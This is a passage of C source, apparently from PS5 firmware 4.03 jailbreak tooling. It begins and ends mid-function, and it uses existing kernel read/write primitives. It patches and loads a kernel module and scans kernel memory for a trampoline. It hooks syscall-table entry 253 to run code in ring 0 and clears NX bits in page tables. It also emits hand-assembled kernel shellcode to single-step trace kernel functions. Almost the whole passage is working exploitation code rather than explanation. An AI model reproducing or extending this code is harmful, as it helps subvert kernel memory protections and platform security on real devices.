        SCE_KERNEL_PROT_CPU_RW, 0, result_phys, 0x4000);
    if (ret != 0) { printf("[-] MapDirectMemory failed: 0x%x\n", ret); return; }

    memset(result_vaddr, 0, KMOD_RESULT_ALLOC_SIZE);

    uint64_t cpu_pa = va_to_cpu_pa((uint64_t)result_vaddr);
    if (cpu_pa == 0) { printf("[-] Page table walk failed for result buffer\n"); return; }

    uint64_t result_kva = g_dmap_base + cpu_pa;
    printf("[+] Result buffer: VA=0x%lx PA=0x%lx DMAP=0x%lx\n",
           (unsigned long)result_vaddr, (unsigned long)cpu_pa, (unsigned long)result_kva);

    /* DMAP verify */
    volatile uint64_t *test_ptr = (volatile uint64_t *)result_vaddr;
    *test_ptr = 0xBEEFCAFE12345678ULL;
    uint64_t verify;
    kernel_copyout(result_kva, &verify, sizeof(verify));
    if (verify != 0xBEEFCAFE12345678ULL) {
        printf("[-] DMAP verification failed!\n");
        return;
    }
    *test_ptr = 0;
    printf("[+] DMAP verified OK\n");

    /* Step 2: Patch g_output_kva in .ko */
    void *ko_buf = malloc((size_t)KMOD_KO_SZ);
    if (!ko_buf) { printf("[-] malloc failed\n"); return; }
    memcpy(ko_buf, KMOD_KO, (size_t)KMOD_KO_SZ);

    uint8_t *ko_bytes = (uint8_t *)ko_buf;
    int patched = 0;

    Elf64_Ehdr_t *ehdr = (Elf64_Ehdr_t *)ko_bytes;
    if (ehdr->e_shoff && ehdr->e_shnum > 0) {
        Elf64_Shdr_t *shdrs = (Elf64_Shdr_t *)(ko_bytes + ehdr->e_shoff);
        Elf64_Shdr_t *symtab_sh = NULL;
        for (uint16_t i = 0; i < ehdr->e_shnum; i++) {
            if (shdrs[i].sh_type == SHT_SYMTAB) { symtab_sh = &shdrs[i]; break; }
        }
        if (symtab_sh) {
            Elf64_Sym_t *syms = (Elf64_Sym_t *)(ko_bytes + symtab_sh->sh_offset);
            uint64_t nsyms = symtab_sh->sh_size / sizeof(Elf64_Sym_t);
            char *strtab = (char *)(ko_bytes + shdrs[symtab_sh->sh_link].sh_offset);
            for (uint64_t i = 0; i < nsyms; i++) {
                if (strcmp(strtab + syms[i].st_name, "g_output_kva") == 0) {
                    uint16_t shndx = syms[i].st_shndx;
                    if (shndx < ehdr->e_shnum) {
                        uint64_t file_off = shdrs[shndx].sh_offset + syms[i].st_value;
                        if (file_off + 8 <= (size_t)KMOD_KO_SZ) {
                            memcpy(ko_bytes + file_off, &result_kva, 8);
                            printf("[+] Patched g_output_kva at .ko+0x%lx -> 0x%lx\n",
                                   (unsigned long)file_off, (unsigned long)result_kva);
                            patched = 1;
                        }
                    }
                    break;
                }
            }
        }
    }

    if (!patched) {
        /* Fallback: patch LAST sentinel occurrence */
        size_t last = (size_t)-1;
        for (size_t i = 0; i + 8 <= (size_t)KMOD_KO_SZ; i++) {
            uint64_t val;
            memcpy(&val, &ko_bytes[i], 8);
            if (val == OUTPUT_KVA_SENTINEL) last = i;
        }
        if (last != (size_t)-1) {
            memcpy(&ko_bytes[last], &result_kva, 8);
            printf("[+] Patched last sentinel at .ko+0x%zx\n", last);
            patched = 1;
        }
    }

    if (!patched) {
        printf("[-] Could not find g_output_kva in .ko!\n");
        free(ko_buf);
        return;
    }

    /* Write patched .ko to disk */
    FILE *ko = fopen("/data/etaHEN/hv_kmod.ko", "wb");
    if (!ko) { printf("[-] fopen hv_kmod.ko failed\n"); free(ko_buf); return; }
    fwrite(ko_buf, 1, (size_t)KMOD_KO_SZ, ko);
    fclose(ko);
    free(ko_buf);
    printf("[+] Wrote /data/etaHEN/hv_kmod.ko\n");

    /* Step 3: kldload */
    int kid = syscall(SYS_kldload, "/data/etaHEN/hv_kmod.ko");
    if (kid < 0) {
        printf("[-] kldload failed: errno=%d (%s)\n", errno, strerror(errno));
        kid = 0;
    } else {
        printf("[+] kldload kid=%d\n", kid);
    }
    g_kmod_kid = kid;

    /* Get kldstat info */
    struct kld_file_stat kfs;
    memset(&kfs, 0, sizeof(kfs));
    if (kid > 0) {
        kfs.version = sizeof(kfs);
        int ks_ret = syscall(SYS_kldstat, kid, &kfs);
        if (ks_ret == 0 && kfs.address != 0) {
            printf("[+] kldstat: base=0x%lx size=0x%lx\n",
                   (unsigned long)kfs.address, (unsigned long)kfs.size);
        } else {
            printf("[*] kldstat: address=0x%lx (may need scanner)\n",
                   (unsigned long)(uintptr_t)kfs.address);
        }
    }

    /* Poll for SYSINIT */
    struct kmod_result_buf *results = (struct kmod_result_buf *)result_vaddr;
    uint64_t first_qword;
    memcpy(&first_qword, (void *)result_vaddr, 8);
    if (first_qword == 0) {
        printf("[*] Polling for deferred SYSINIT...\n");
        for (int poll = 0; poll < 40; poll++) {
            usleep(50000);
            memcpy(&first_qword, (void *)result_vaddr, 8);
            if (first_qword != 0) {
                printf("[+] SYSINIT fired after %dms\n", (poll + 1) * 50);
                break;
            }
        }
    }

    /* ── If SYSINIT didn't fire, scan for trampoline + IDT invoke ──
     *
     * PS5 FW 4.03 does NOT process SYSINIT or MOD_LOAD for kldload'd
     * modules. We locate hv_idt_trampoline in kernel memory by scanning
     * for its machine code signature, then hook an IDT entry to invoke it. */
    if (first_qword == 0) {
        printf("\n[*] SYSINIT did not fire — scanning for trampoline...\n");

        /* hv_idt_trampoline signature */
        static const uint8_t tramp_prefix[] = {
            0x50, 0x51, 0x52, 0x56, 0x57,                         /* push rax..rdi */
            0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53,       /* push r8..r11 */
            0x31, 0xff                                              /* xor edi,edi */
        };
        static const uint8_t tramp_suffix[] = {
            0x41, 0x5b, 0x41, 0x5a, 0x41, 0x59, 0x41, 0x58,       /* pop r11..r8 */
            0x5f, 0x5e, 0x5a, 0x59, 0x58,                         /* pop rdi..rax */
            0x48, 0xcf                                              /* iretq */
        };
        const int suffix_off = 0x14;

        uint64_t trampoline_kva = 0;
        uint8_t hdr[256];

        /* Try kldstat-reported base first */
        if (kfs.address != 0) {
            uint64_t mod_pa = va_to_pa(kfs.address);
            if (mod_pa && mod_pa < MAX_SAFE_PA) {
                if (kernel_copyout(g_dmap_base + mod_pa, hdr, sizeof(hdr)) == 0) {
                    if (memcmp(hdr, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
                        memcmp(hdr + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
                        trampoline_kva = kfs.address;
                        printf("[+] Trampoline at kldstat base 0x%lx\n",
                               (unsigned long)trampoline_kva);
                    }
                }
            }
        }

        /* Hierarchical page-table scan of ktext→top
         * Start from ktext (not kdata) because kmod may be loaded
         * anywhere in the kernel VA range, including between ktext
         * and kdata. */
        if (!trampoline_kva) {
            printf("[*] Hierarchical scan: ktext → top...\n");
            fflush(stdout);

            uint64_t rs = g_ktext_base, re = 0xFFFFFFFFFFE00000ULL;
            uint64_t va = rs & ~0x1FFFFFULL;
            uint64_t pages_checked = 0;

            #define VA_NEXT_2MB(va, re) do { \
                uint64_t _old = (va); (va) += (1ULL << 21); \
                if ((va) <= _old) (va) = (re); \
            } while (0)

            for (; va < re && !trampoline_kva; ) {
                uint64_t pml4e;
                kernel_copyout(g_dmap_base + g_cr3_phys +
                               ((va >> 39) & 0x1FF) * 8, &pml4e, 8);
                if (!(pml4e & PTE_PRESENT)) {
                    uint64_t n = (va + (1ULL << 39)) & ~((1ULL << 39) - 1);
                    if (n <= va) break; va = n; continue;
                }
                uint64_t pdpt_pa = pml4e & PTE_PA_MASK;
                if (pdpt_pa >= MAX_SAFE_PA) {
                    uint64_t n = (va + (1ULL << 30)) & ~((1ULL << 30) - 1);
                    if (n <= va) break; va = n; continue;
                }
                uint64_t pdpte;
                kernel_copyout(g_dmap_base + pdpt_pa +
                               ((va >> 30) & 0x1FF) * 8, &pdpte, 8);
                if (!(pdpte & PTE_PRESENT) || (pdpte & PTE_PS)) {
                    uint64_t n = (va + (1ULL << 30)) & ~((1ULL << 30) - 1);
                    if (n <= va) break; va = n; continue;
                }
                uint64_t pd_pa = pdpte & PTE_PA_MASK;
                if (pd_pa >= MAX_SAFE_PA) { VA_NEXT_2MB(va, re); continue; }
                uint64_t pde;
                kernel_copyout(g_dmap_base + pd_pa +
                               ((va >> 21) & 0x1FF) * 8, &pde, 8);
                if (!(pde & PTE_PRESENT)) { VA_NEXT_2MB(va, re); continue; }

                if (pde & PTE_PS) {
                    /* 2MB huge page — check each 4KB */
                    uint64_t base_pa = pde & 0x000FFFFFFFE00000ULL;
                    if (base_pa >= MAX_SAFE_PA) { VA_NEXT_2MB(va, re); continue; }
                    uint64_t cs = va & ~0x1FFFFFULL;
                    for (int pi = 0; pi < 512 && !trampoline_kva; pi++) {
                        uint64_t pva = cs + (uint64_t)pi * 0x1000;
                        if (pva < rs) continue;
                        uint64_t pa = base_pa + (uint64_t)pi * 0x1000;
                        if (pa >= MAX_SAFE_PA) continue;
                        uint8_t pg[4096];
                        if (kernel_copyout(g_dmap_base + pa, pg, 4096) != 0) continue;
                        pages_checked++;
                        for (int off = 0; off <= 4096 - suffix_off - (int)sizeof(tramp_suffix); off++) {
                            if (memcmp(pg + off, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
                                memcmp(pg + off + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
                                trampoline_kva = pva + off;
                                memcpy(hdr, pg + off, (4096 - off > 256) ? 256 : 4096 - off);
                            }
                        }
                    }
                    VA_NEXT_2MB(va, re); continue;
                }

                /* 4KB pages: bulk-read PT */
                uint64_t pt_pa = pde & PTE_PA_MASK;
                if (pt_pa >= MAX_SAFE_PA) { VA_NEXT_2MB(va, re); continue; }
                uint64_t pt_entries[512];
                kernel_copyout(g_dmap_base + pt_pa, pt_entries, sizeof(pt_entries));
                uint64_t cs = va & ~0x1FFFFFULL;
                for (int pi = 0; pi < 512 && !trampoline_kva; pi++) {
                    uint64_t pva = cs + (uint64_t)pi * 0x1000;
                    if (pva < rs) continue;
                    if (!(pt_entries[pi] & PTE_PRESENT)) continue;
                    uint64_t pa = pt_entries[pi] & PTE_PA_MASK;
                    if (pa >= MAX_SAFE_PA) continue;
                    uint8_t pg[4096];
                    if (kernel_copyout(g_dmap_base + pa, pg, 4096) != 0) continue;
                    pages_checked++;
                    for (int off = 0; off <= 4096 - suffix_off - (int)sizeof(tramp_suffix); off++) {
                        if (memcmp(pg + off, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
                            memcmp(pg + off + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
                            trampoline_kva = pva + off;
                            memcpy(hdr, pg + off, (4096 - off > 256) ? 256 : 4096 - off);
                        }
                    }
                }
                VA_NEXT_2MB(va, re);
            }
            printf("    Scanned %lu pages\n", (unsigned long)pages_checked);
        }

        /* Diagnostics: dump raw kldstat buffer to understand PS5 layout */
        if (!trampoline_kva && kid > 0) {
            printf("[*] kldstat diagnostics (raw buffer):\n");
            uint8_t raw_kfs[2080];
            memset(raw_kfs, 0, sizeof(raw_kfs));
            *(int *)raw_kfs = (int)sizeof(raw_kfs);
            int ks2 = syscall(SYS_kldstat, kid, raw_kfs);
            printf("    kldstat ret=%d\n", ks2);
            /* Dump bytes around the address field (offset ~1040) */
            printf("    raw[1028..1063]: ");
            for (int i = 1028; i < 1064 && i < (int)sizeof(raw_kfs); i++)
                printf("%02x ", raw_kfs[i]);
            printf("\n");
            /* Also check if address is at a different offset */
            printf("    Scanning for non-zero uint64 after name[1024]:\n");
            for (int off = 1028; off <= 1060; off += 4) {
                uint64_t v;
                memcpy(&v, raw_kfs + off, 8);
                if (v != 0)
                    printf("      offset %d: 0x%016lx\n", off, (unsigned long)v);
            }
        }

        if (trampoline_kva) {
            printf("[+] FOUND trampoline at 0x%lx\n", (unsigned long)trampoline_kva);

            /* ── Invoke hv_init via sysent hook (no IDT manipulation) ──
             *
             * Extract hv_init address from the trampoline's CALL instruction,
             * hook sysent[253] to point to hv_init, call syscall(253).
             * This avoids IDT hooking which causes panics on PS5. */

            /* The call instruction is at offset 15 (after the push/xor prefix).
             * Format: E8 <rel32>  →  target = call_addr + 5 + rel32 */
            uint64_t hv_init_kva = 0;
            if (hdr[15] == 0xE8) {
                int32_t rel32;
                memcpy(&rel32, &hdr[16], 4);
                hv_init_kva = trampoline_kva + 15 + 5 + (int64_t)rel32;
                printf("[+] hv_init extracted from CALL: 0x%016lx\n",
                       (unsigned long)hv_init_kva);
            } else {
                printf("[-] Expected E8 (CALL) at trampoline+15, got 0x%02x\n",
                       hdr[15]);
            }

            if (hv_init_kva && g_sysent_kva) {
                /* Hook sysent[253].sy_call to hv_init */
                #define KMOD_INVOKE_SYSCALL 253
                uint64_t ent_kva = g_sysent_kva +
                                   (uint64_t)KMOD_INVOKE_SYSCALL * SYSENT_STRIDE;
                uint64_t ent_pa = va_to_pa(ent_kva);
                if (!ent_pa) {
                    printf("[-] sysent[%d] VA->PA failed\n", KMOD_INVOKE_SYSCALL);
                } else {
                    /* Save original sysent entry */
                    uint8_t orig_sysent[SYSENT_STRIDE];
                    kernel_copyout(g_dmap_base + ent_pa, orig_sysent, SYSENT_STRIDE);

                    /* Write hv_init to sy_call (offset +8) */
                    uint64_t call_pa = va_to_pa(ent_kva + 8);
                    if (call_pa) {
                        kernel_copyin(&hv_init_kva, g_dmap_base + call_pa, 8);

                        /* Set narg=0 (offset +0) */
                        int32_t narg_zero = 0;
                        kernel_copyin(&narg_zero, g_dmap_base + ent_pa, 4);

                        printf("[+] sysent[%d] hooked -> hv_init 0x%lx\n",
                               KMOD_INVOKE_SYSCALL, (unsigned long)hv_init_kva);

                        /* Invoke! */
                        printf("[*] Calling syscall(%d) to invoke hv_init...\n",
                               KMOD_INVOKE_SYSCALL);
                        fflush(stdout);

                        syscall(KMOD_INVOKE_SYSCALL);
                        printf("[+] syscall(%d) returned!\n", KMOD_INVOKE_SYSCALL);

                        /* Restore sysent immediately */
                        kernel_copyin(orig_sysent, g_dmap_base + ent_pa,
                                      SYSENT_STRIDE);
                        printf("[+] sysent[%d] restored\n", KMOD_INVOKE_SYSCALL);

                        /* Re-read result buffer */
                        memcpy(&first_qword, (void *)result_vaddr, 8);
                    }
                }
            } else if (!g_sysent_kva) {
                printf("[-] sysent not discovered — cannot invoke kmod\n");
            }
        } else {
            printf("[-] Trampoline not found in kernel memory\n");
        }
    }

    /* Read results */
    if (results->magic == KMOD_MAGIC && results->status == KMOD_STATUS_DONE) {
        printf("\n[+] Kmod init completed successfully.\n");

        printf("\n[*] MSR/CR values from ring 0:\n");
        for (uint32_t i = 0; i < results->num_msr_results; i++) {
            if (!results->msr_results[i].valid) continue;
            uint32_t id = results->msr_results[i].msr_id;
            uint64_t val = results->msr_results[i].value;
            const char *name = "unknown";
            switch (id) {
                case 0xC0000080: name = "EFER"; break;
                case 0xC0000081: name = "STAR"; break;
                case 0xC0000082: name = "LSTAR"; break;
                case 0xC0000084: name = "SFMASK"; break;
                case 0xC0000100: name = "FS_BASE"; break;
                case 0xC0000101: name = "GS_BASE"; break;
                case 0xC0000102: name = "KGS_BASE"; break;
                case 0xC0000103: name = "TSC_AUX"; break;
                case 0xFFFF0000: name = "CR0"; break;
                case 0xFFFF0003: name = "CR3"; break;
                case 0xFFFF0004: name = "CR4"; break;
            }
            printf("    %-10s (0x%08x) = 0x%016lx\n", name, id, (unsigned long)val);
            if (id == 0xC0000082) {
                printf("    → LSTAR is ktext+0x%lx\n",
                       (unsigned long)(val - g_ktext_base));
            }
        }

        if (results->idt_trampoline_kva) {
            printf("[+] IDT trampoline KVA: 0x%016lx\n",
                   (unsigned long)results->idt_trampoline_kva);
        }
    } else {
        printf("[!] Kmod init did not complete (magic=0x%lx status=%u)\n",
               (unsigned long)results->magic, results->status);
        printf("    First qword: 0x%016lx\n", (unsigned long)first_qword);
    }

    /* Unload — DO NOT unload if trampoline was found and may still be needed */
    if (kid > 0) {
        syscall(SYS_kldunload, kid);
        printf("[*] Unloaded kmod (kid=%d)\n", kid);
    }
}

/* ─── Kstuff offset verification ─── */

static void verify_kstuff_offsets(void) {
    printf("\n=============================================\n");
    printf("  Verifying Known Offsets (FW 4.03)\n");
    printf("=============================================\n\n");

    if (g_fw_version != 0x4030000) {
        printf("[*] Not FW 4.03 — skipping known-offset verification.\n");
        printf("    These offsets need to be DISCOVERED on this FW.\n\n");
        return;
    }

    /* IDT verification */
    uint64_t ks_idt = g_kdata_base + KSTUFF_IDT_OFF;
    uint64_t idt_pa = va_to_pa(ks_idt);
    if (idt_pa) {
        /* Read IDT[0] (divide error) — should have a valid ktext handler */
        uint8_t idt0[16];
        kernel_copyout(g_dmap_base + idt_pa, idt0, 16);
        uint64_t handler0 = (uint64_t)idt0[0] | ((uint64_t)idt0[1] << 8) |
                            ((uint64_t)idt0[6] << 16) | ((uint64_t)idt0[7] << 24) |
                            ((uint64_t)*(uint32_t*)&idt0[8] << 32);
        int in_ktext = (handler0 >= g_ktext_base &&
                        handler0 < g_ktext_base + 0x2000000);
        printf("[%c] IDT at kdata+0x%lx: handler[0]=0x%lx %s\n",
               in_ktext ? '+' : '-',
               (unsigned long)KSTUFF_IDT_OFF,
               (unsigned long)handler0,
               in_ktext ? "(ktext)" : "(NOT ktext!)");

        /* Print handlers for key vectors */
        static const struct { int vec; const char *name; } vecs[] = {
            {1, "#DB"}, {3, "#BP"}, {13, "#GP"}, {14, "#PF"},
            {244, "Xinvtlb"}, {255, "Xjustreturn?"},
        };
        for (int vi = 0; vi < (int)(sizeof(vecs)/sizeof(vecs[0])); vi++) {
            uint8_t gate[16];
            uint64_t gate_pa = va_to_pa(ks_idt + vecs[vi].vec * 16);
            if (!gate_pa) continue;
            kernel_copyout(g_dmap_base + gate_pa, gate, 16);
            uint64_t h = (uint64_t)gate[0] | ((uint64_t)gate[1] << 8) |
                         ((uint64_t)gate[6] << 16) | ((uint64_t)gate[7] << 24) |
                         ((uint64_t)*(uint32_t*)&gate[8] << 32);
            printf("    IDT[%3d] %-12s = 0x%016lx (ktext+0x%lx)\n",
                   vecs[vi].vec, vecs[vi].name, (unsigned long)h,
                   (unsigned long)(h - g_ktext_base));
        }
    } else {
        printf("[-] IDT VA->PA failed\n");
    }

    /* ktext offset verification */
    printf("\n[*] ktext offsets (negative from kdata):\n");
    struct { const char *name; int64_t off; } ktext_offs[] = {
        {"doreti_iret",  KSTUFF_DORETI_IRET_OFF},
        {"nop_ret",      KSTUFF_NOP_RET_OFF},
        {"justreturn",   KSTUFF_JUSTRETURN_OFF},
        {"Xinvtlb",      KSTUFF_XINVTLB_OFF},
        {"copyin",       KSTUFF_COPYIN_OFF},
        {"copyout",      KSTUFF_COPYOUT_OFF},
    };
    for (int i = 0; i < (int)(sizeof(ktext_offs)/sizeof(ktext_offs[0])); i++) {
        uint64_t addr = g_kdata_base + ktext_offs[i].off;
        int in_ktext = (addr >= g_ktext_base && addr < g_ktext_base + 0x2000000);
        printf("    %-16s = 0x%016lx (ktext+0x%lx) %s\n",
               ktext_offs[i].name, (unsigned long)addr,
               (unsigned long)(addr - g_ktext_base),
               in_ktext ? "[OK]" : "[BAD]");
    }

    printf("\n");
    fflush(stdout);
}

/* ─── PTE NX-bit management ─── */

/* Clear NX bit on the 2MB PDE covering a given KVA.
 * Returns: 1 if NX was cleared (or already clear), 0 on failure. */
static int clear_pte_nx(uint64_t kva) {
    uint64_t e;
    /* PML4 */
    kernel_copyout(g_dmap_base + g_cr3_phys + ((kva >> 39) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;
    /* PDPT */
    uint64_t pdpt_pa = e & PTE_PA_MASK;
    kernel_copyout(g_dmap_base + pdpt_pa + ((kva >> 30) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;
    /* PD */
    uint64_t pd_pa = e & PTE_PA_MASK;
    uint64_t pd_off = ((kva >> 21) & 0x1FF) * 8;
    kernel_copyout(g_dmap_base + pd_pa + pd_off, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;

    int nx = (int)(e >> 63);
    if (nx) {
        e &= ~(1ULL << 63);  /* clear NX */
        kernel_copyin(&e, g_dmap_base + pd_pa + pd_off, 8);
        printf("[+] Cleared NX on PDE for 0x%lx\n", (unsigned long)kva);
    }
    return 1;
}

/* Check if NX is clear on the PDE covering a given KVA */
static int check_nx_clear(uint64_t kva) {
    uint64_t e;
    kernel_copyout(g_dmap_base + g_cr3_phys + ((kva >> 39) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;
    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((kva >> 30) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;
    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((kva >> 21) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;
    return !(e >> 63);  /* 1 if NX=0 */
}

/* ═══════════════════════════════════════════════════════════════════
 *  Phase 1: Generic TF Single-Step Trace
 *
 *  Traces an arbitrary kernel function by:
 *  1. Allocating a separate direct memory buffer for shellcode
 *  2. Clearing NX on its guest PDE so code can execute
 *  3. Writing #DB handler + launcher shellcode to the buffer
 *  4. Hooking IDT[1] to the #DB handler
 *  5. Hooking sysent[253] to the launcher
 *  6. Calling syscall(253) from userland
 *  7. Reading the trace buffer (RIP, RAX per instruction)
 *
 *  IMPORTANT: We do NOT use kdata for shellcode — those offsets
 *  contain active kernel data and overwriting them causes panics.
 *  Instead we allocate fresh physically-contiguous memory.
 * ═══════════════════════════════════════════════════════════════════ */

#define TF_MAX_TRACE    256
#define TF_TEST_SYSCALL 253   /* nosys — safe to hook */
#define TF_DB_OFF       0x000 /* #DB handler at start of buffer */
#define TF_LAUNCHER_OFF 0x100 /* launcher at +256 */
#define TF_TRACE_OFF    0x200 /* trace buffer at +512 */
/* Buffer size: 0x200 + 256*16 = 0x1200, allocate 0x4000 (16KB) */
#define TF_BUF_SIZE     0x4000

struct tf_trace_entry {
    uint64_t rip;
    uint64_t rax;
};

struct tf_trace_result {
    uint32_t count;
    uint32_t retval;
    struct tf_trace_entry entries[TF_MAX_TRACE];
    int ktext_count;     /* filled by analysis */
};

static int tf_trace_function(uint64_t target_func, struct tf_trace_result *out) {
    memset(out, 0, sizeof(*out));

    printf("[*] TF trace: target = 0x%016lx (ktext+0x%lx)\n",
           (unsigned long)target_func,
           (unsigned long)(target_func - g_ktext_base));

    /* Prerequisites */
    if (!g_sysent_kva) {
        printf("[-] sysent not discovered\n");
        return -1;
    }

    /* Allocate a dedicated buffer for shellcode + trace data.
     * This avoids overwriting active kernel data in kdata. */
    off_t tf_phys = 0;
    void *tf_vaddr = NULL;

    int ret = sceKernelAllocateDirectMemory(0, 0x180000000ULL,
        TF_BUF_SIZE, 0x4000, SCE_KERNEL_WB_ONION, &tf_phys);
    if (ret != 0) {
        printf("[-] AllocateDirectMemory for TF buffer failed: 0x%x\n", ret);
        return -1;
    }
    ret = sceKernelMapDirectMemory(&tf_vaddr, TF_BUF_SIZE,
        SCE_KERNEL_PROT_CPU_RW, 0, tf_phys, 0x4000);
    if (ret != 0) {
        printf("[-] MapDirectMemory for TF buffer failed: 0x%x\n", ret);
        return -1;
    }
    memset(tf_vaddr, 0, TF_BUF_SIZE);

    /* Get CPU PA via page table walk */
    uint64_t tf_cpu_pa = va_to_cpu_pa((uint64_t)tf_vaddr);
    if (!tf_cpu_pa) {
        printf("[-] Page table walk failed for TF buffer\n");
        return -1;
    }

    uint64_t tf_kva = g_dmap_base + tf_cpu_pa;
    printf("[+] TF buffer: VA=0x%lx PA=0x%lx DMAP=0x%lx\n",
           (unsigned long)tf_vaddr, (unsigned long)tf_cpu_pa,
           (unsigned long)tf_kva);

    /* DMAP verify */
    volatile uint64_t *tp = (volatile uint64_t *)tf_vaddr;
    *tp = 0xDEADFACE11111111ULL;
    uint64_t vfy;
    kernel_copyout(tf_kva, &vfy, 8);
    if (vfy != 0xDEADFACE11111111ULL) {
        printf("[-] TF buffer DMAP verify failed!\n");
        return -1;
    }
    *tp = 0;

    /* Clear NX on the PDE covering our DMAP buffer address */
    if (!check_nx_clear(tf_kva)) {
        printf("[*] Clearing NX on TF buffer PDE...\n");
        if (!clear_pte_nx(tf_kva)) {
            printf("[-] Failed to clear NX on TF buffer\n");
            return -1;
        }
    }
    printf("[+] TF buffer NX=0 (code execution enabled)\n");

    /* Compute DMAP addresses for shellcode/trace regions */
    uint64_t db_handler_kva  = tf_kva + TF_DB_OFF;
    uint64_t launcher_kva    = tf_kva + TF_LAUNCHER_OFF;
    uint64_t db_handler_dmap = tf_kva + TF_DB_OFF;
    uint64_t launcher_dmap   = tf_kva + TF_LAUNCHER_OFF;
    uint64_t trace_buf_dmap  = tf_kva + TF_TRACE_OFF;

    /* ── Build #DB handler shellcode ──
     *
     * On entry: CPU pushed SS, RSP, RFLAGS, CS, RIP (TF cleared in RFLAGS)
     * Saved RFLAGS on stack still has TF=1 (IRET re-enables it)
     *
     * Handler:
     *   1. push rax, rbx, rcx
     *   2. Load trace buffer DMAP VA (immediate)
     *   3. Read count from [buf+0]
     *   4. If count >= MAX: clear TF in saved RFLAGS, IRET
     *   5. Store {saved_RIP, saved_RAX} at buf + 8 + count*16
     *   6. Increment count
     *   7. pop rcx, rbx, rax; IRETQ
     */
    {
        uint8_t db[128];
        int dp = 0;

        #define EMIT(b) do { if (dp < (int)sizeof(db)) db[dp++] = (uint8_t)(b); } while(0)
        #define EMIT_U32(v) do { uint32_t _v=(v); if(dp+4<=(int)sizeof(db)){memcpy(&db[dp],&_v,4);dp+=4;} } while(0)
        #define EMIT_U64(v) do { uint64_t _v=(v); if(dp+8<=(int)sizeof(db)){memcpy(&db[dp],&_v,8);dp+=8;} } while(0)

        EMIT(0x50);  /* push rax */
        EMIT(0x53);  /* push rbx */
        EMIT(0x51);  /* push rcx */

        /* movabs $trace_buf_dmap, %rbx */
        EMIT(0x48); EMIT(0xBB); EMIT_U64(trace_buf_dmap);

        /* mov (%rbx), %ecx — load count */
        EMIT(0x8B); EMIT(0x0B);

        /* cmp $TF_MAX_TRACE, %ecx */
        EMIT(0x81); EMIT(0xF9); EMIT_U32(TF_MAX_TRACE);

        /* jge .stop */
        EMIT(0x7D);
        int jge_patch = dp;
        EMIT(0x00);

        /* lea 8(%rbx), %rax */
        EMIT(0x48); EMIT(0x8D); EMIT(0x43); EMIT(0x08);

        /* shl $4, %ecx */
        EMIT(0xC1); EMIT(0xE1); EMIT(0x04);

        /* add %rcx, %rax */
        EMIT(0x48); EMIT(0x01); EMIT(0xC8);

        /* mov 24(%rsp), %rcx — saved RIP */
        EMIT(0x48); EMIT(0x8B); EMIT(0x4C); EMIT(0x24); EMIT(0x18);

        /* mov %rcx, (%rax) — store RIP */
        EMIT(0x48); EMIT(0x89); EMIT(0x08);

        /* mov 16(%rsp), %rcx — saved RAX */
        EMIT(0x48); EMIT(0x8B); EMIT(0x4C); EMIT(0x24); EMIT(0x10);

        /* mov %rcx, 8(%rax) — store RAX */
        EMIT(0x48); EMIT(0x89); EMIT(0x48); EMIT(0x08);

        /* incl (%rbx) — count++ */
        EMIT(0xFF); EMIT(0x03);

        /* pop rcx; pop rbx; pop rax; iretq */
        EMIT(0x59); EMIT(0x5B); EMIT(0x58);
        EMIT(0x48); EMIT(0xCF);

        /* .stop: clear TF in saved RFLAGS */
        int stop_label = dp;
        db[jge_patch] = (uint8_t)(stop_label - (jge_patch + 1));

        /* andq $~0x100, 40(%rsp) */
        EMIT(0x48); EMIT(0x81); EMIT(0x64); EMIT(0x24);
        EMIT(0x28); EMIT_U32(0xFFFFFEFF);

        /* pop rcx; pop rbx; pop rax; iretq */
        EMIT(0x59); EMIT(0x5B); EMIT(0x58);
        EMIT(0x48); EMIT(0xCF);

        printf("[*] #DB handler: %d bytes\n", dp);
        kernel_copyin(db, db_handler_dmap, dp);

        /* Verify */
        uint8_t vfy[128];
        kernel_copyout(db_handler_dmap, vfy, dp);
        if (memcmp(db, vfy, dp) != 0) {
            printf("[-] #DB handler write failed!\n");
            goto restore;
        }
    }

    /* ── Build launcher shellcode ──
     *
     * Called as syscall handler: sys_foo(td, uap)
     *   1. Enable TF (pushfq; or TF; popfq)
     *   2. CALL target (each instruction triggers #DB)
     *   3. Disable TF
     *   4. Store return value to trace buffer +4
     *   5. Return 0 (syscall success)
     */
    {
        uint8_t lc[128];
        int lp = 0;

        #undef EMIT
        #undef EMIT_U32
        #undef EMIT_U64
        #define EMIT(b) do { if (lp < (int)sizeof(lc)) lc[lp++] = (uint8_t)(b); } while(0)
        #define EMIT_U32(v) do { uint32_t _v=(v); if(lp+4<=(int)sizeof(lc)){memcpy(&lc[lp],&_v,4);lp+=4;} } while(0)
        #define EMIT_U64(v) do { uint64_t _v=(v); if(lp+8<=(int)sizeof(lc)){memcpy(&lc[lp],&_v,8);lp+=8;} } while(0)

        /* Save callee-saved */
        EMIT(0x53);  /* push rbx */
        EMIT(0x55);  /* push rbp */
        EMIT(0x41); EMIT(0x54);  /* push r12 */

        /* movabs $target, %r12 */
        EMIT(0x49); EMIT(0xBC); EMIT_U64(target_func);

        /* Enable TF: pushfq; or $0x100, (%rsp); popfq */
        EMIT(0x9C);
        EMIT(0x48); EMIT(0x81); EMIT(0x0C); EMIT(0x24); EMIT_U32(0x100);
        EMIT(0x9D);

        /* call *%r12 */
        EMIT(0x41); EMIT(0xFF); EMIT(0xD4);

        /* Disable TF */
        EMIT(0x9C);
        EMIT(0x48); EMIT(0x81); EMIT(0x24); EMIT(0x24); EMIT_U32(0xFFFFFEFF);
        EMIT(0x9D);

        /* Save return value: movabs $trace_buf_dmap, %rbx; mov %eax, 4(%rbx) */
        EMIT(0x48); EMIT(0xBB); EMIT_U64(trace_buf_dmap);
